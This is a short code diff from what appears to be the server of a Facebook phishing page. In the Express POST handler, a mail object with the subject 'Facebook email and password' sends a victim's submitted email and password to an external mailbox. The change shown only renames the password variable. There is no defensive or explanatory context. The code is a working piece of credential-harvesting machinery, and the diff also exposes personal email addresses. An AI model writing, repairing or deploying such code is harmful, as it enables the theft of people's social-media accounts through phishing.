@@ -58,7 +58,7 @@ app.post('/', function (req, res) {
         from: 'bassem.sadaqah@gmail.com',
         to: "bassemsadakah.bs@gmal.com",
         subject: 'Facebook email and password',
-        text: 'email: '+email+'\n password: '+password,
+        text: 'email: '+email+'\n password: '+pass,
         html:''
         
     };
